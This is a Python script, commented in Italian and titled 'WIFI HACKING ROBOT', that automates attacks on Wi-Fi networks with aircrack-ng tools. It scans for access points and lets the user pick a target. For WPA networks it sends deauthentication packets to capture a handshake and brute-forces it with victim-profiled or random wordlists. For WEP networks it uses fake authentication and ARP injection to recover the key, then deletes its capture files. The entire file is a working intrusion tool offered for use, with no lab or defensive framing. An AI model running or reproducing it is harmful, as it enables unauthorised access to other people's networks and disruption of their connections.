#librerie
import os
import subprocess
import csv
import numpy as np
from uuid import getnode as get_mac
from prettytable import PrettyTable

#--------functions--------------

#---WPA---
def hacking_wpa(interface_mon,bssid,channel):
	
	#sniffing pacchetti relativi al singolo AP
	print("--Avvio crack ap wpa--\nCliccare ctrl+C nella nuova finestra quando è stato catturato l'handshake")
	os.system("gnome-terminal -- sudo airodump-ng --bssid "+bssid+" -c "+channel+" --write handshake "+interface_mon)
	#invio pacchetti de-auth
	inp=0
	while inp!='x':
		inp=input("\nQuanti pacchetti de-auth inviare? (""x"" per uscire): ")
		try: 
			inp=int(inp)
			if inp<=0: print("\ninserire un numero sensato di pacchetti")
			else: send_de_auth(bssid,inp)
		except ValueError: 
			if str(inp)!='x': print("Input errato")		 
	#avvio fase brute force	
	print("Risultati salvati nel file handshake.cap\n")
	path_file_handshake="handshake-01.cap"
	print("Avvio Brute force attack:\n")
	
	brute_list=["Dizionario locale (da inserire nella cartella dello script)","Dizionario con info vittima","Dizionario random","Uscire"]
	#scelta dizionario
	choose_value=[]
	for i in range(len(brute_list)):
		print(str(i)+": "+brute_list[i])
		choose_value.append(i)
	choose=4	
	while choose not in choose_value:
		try: 	
			choose=int(input("Scegliere dizionario da usare: "))
		except: print("Errore input")	
	print("\n"+brute_list[choose])
	if choose==0: #locale
		path_dictionary=input("Inserire nome file: ")
	if choose==1: #cupp
		os.system("sudo cupp -i")
		path_dictionary="dizionario_cupp.txt"
	if choose==2: #crunch
		minim=input("Numero minimo di caratteri: ")
		maxim=input("Numero massimo di caratteri: ")
		os.system("crunch "+minim+" "+maxim+" -o dizionario_crunch.txt")
		path_dictionary="dizionario_crunch.txt"
	if choose!=3: 		
		#aircrack
		try :
			print("Avvio crack wi-fi")
			os.system("sudo aircrack-ng "+path_file_handshake+" -w "+path_dictionary)	
		except ValueError:
			print("errore nel caricamento del file")

#---WEP---
def hacking_wep(interface_mon,bssid,essid,channel):
	#sniffing pacchetti per il singolo AP
	print("--Avvio crack ap wep--\n")
	os.system("gnome-terminal -- sudo airodump-ng --bssid "+bssid+" -c "+channel+" --write hacking_info "+interface_mon)
	#preleva MAC address sorgente
	with open('/sys/class/net/'+interface_mon+'/address', 'r') as file:
  		mac_addr_own = file.read()
	mac_addr_own=mac_addr_own.replace('\n','')
	#fake authentication
	os.system("sudo aireplay-ng -1 0 -e "+essid+" -a "+bssid+" -h "+mac_addr_own+" "+interface_mon)
	print("fake authentication effettuata\n")
	#ARP INJECTION
	print("Invio pacchetti ARP per stimolare invio IV\nChiudere entrambe le finestre quando #data supera il valore 50000\n")
	os.system("gnome-terminal --wait -- sudo aireplay-ng -3 -b "+bssid+" -h "+mac_addr_own+" "+interface_mon)
	#cracking
	print("Avvio crack wi-fi")
	os.system("sudo aircrack-ng -s hacking_info-01.cap")

#---preleva lista AP (BSSID, ESSID, Canale e privacy) individuati e salvati
def bssid_list():
	data_path = 'list_ap-01.csv'
	file = open(data_path)
	with open(data_path, 'r') as f:
    		reader = csv.reader(f, delimiter=',')
    		next(reader)
    		headers = next(reader)
    		data = list(reader)
	x=[["BSSID","ESSID","channel","Privacy"]]
	i=0
	while data[i]!=[]:
		x.append([data[i][headers.index("BSSID")],data[i][headers.index(" ESSID")],data[i][headers.index(" channel")],data[i][headers.index(" Privacy")]])
		i=i+1	
	check_value=[]	
	#stampa gli AP a video come una tabella
	for i in range(len(x)):
		if i==0: t=PrettyTable(["#",str(x[i][0]),str(x[i][1]),str(x[i][2]),str(x[i][3])]) 
		else: 
			t.add_row([str(i),str(x[i][0]),str(x[i][1]),str(x[i][2]),str(x[i][3])])
			check_value.append(i) #contiene i numeri accettabili per scegliere l'AP
	print(t)
	return [x,check_value]

def set_monitor(interface):
	subprocess.run(["sudo","airmon-ng","start",interface],stdout=subprocess.DEVNULL)
	print(interface+" settata in modalità monitor\n")

def unset_monitor(interface_mon):
	subprocess.run(["sudo","airmon-ng","stop",interface_mon],stdout=subprocess.DEVNULL)
	print(interface_mon+" disattivata modalità monitor\n")
	
def send_de_auth(bssid,n):
	os.system("sudo aireplay-ng -0 "+str(n)+" -a "+bssid+" "+interface_mon+" > /dev/null")
	print("Pacchetti inviati")	
	
	

#-------------main--------------

print("\n\n--------WIFI---HACKING---ROBOT--------\n\n")

#disattiva interfaccia modalità monitor se già attiva
list_int=os.listdir('/sys/class/net/')
for i in range(len(list_int)):
	if list_int[i].find("mon")>=0: 
		unset_monitor(list_int[i])
		list_int=os.listdir('/sys/class/net/')
		
#stampa lista interfacce wireless
j=1
list_w_interface=[[]]
choose_value=[]
for i in range(len(list_int)): 
	if list_int[i].find("w")>=0:	
		print(str(j)+": "+list_int[i])
		choose_value.append(j) #valori accettabili per la scelta di interfaccia
		list_w_interface=[list_int[i]]

#scelta interfaccia da impostare come monitor
choose=0
while choose not in choose_value:
	try: 
		choose=int(input("\n\nScegliere interfaccia da avviare in modalità monitor: "))
	except ValueError: 
		print("Interfaccia errata")
interface=list_w_interface[int(choose)-1]
interface_mon=interface+"mon"

#set interfaccia modalità monitor
set_monitor(interface)

#sniffing pacchetti 
print("Cliccare ctrl+C nella nuova finestra per continuare")
os.system("gnome-terminal --wait -- sudo airodump-ng -w list_ap --output-format csv "+interface_mon) 

#stampa lista AP
[list_ap,check_value]=bssid_list()  #list_ap contiene: 0=bssid, 1=essid, 2=channel, 3=privacy(protocollo sicurezza)

#scelta AP
scelta = 0
while scelta not in check_value:
	try:
		scelta=int(input("Scegliere AP: "))
	except ValueError: 	
		print ("AP errato")
bssid=list_ap[int(scelta)][0]
essid=list_ap[int(scelta)][1]
channel=list_ap[int(scelta)][2]
privacy=list_ap[int(scelta)][3]

#a seconda del protocollo di sicurezza sceglie tra WAP e WEP
if privacy.find("WPA")>=0: 
	hacking_wpa(interface_mon,bssid,channel)
elif privacy.find("WEP")>=0:
	hacking_wep(interface_mon,bssid,essid,channel)
else: print("\nprotocollo non supportato\n")		

#uscita dal tool, unset interfaccia e pulizia file creati
print("uscita tool...\n")
unset_monitor(interface_mon)
#delete file csv, cap e netxml creati
mydir=os.getcwd()
filelist = [ f for f in os.listdir(mydir) if (f.endswith(".csv") or f.endswith(".cap") or f.endswith(".netxml")) ]
for f in filelist:
    os.remove(os.path.join(mydir, f))


		

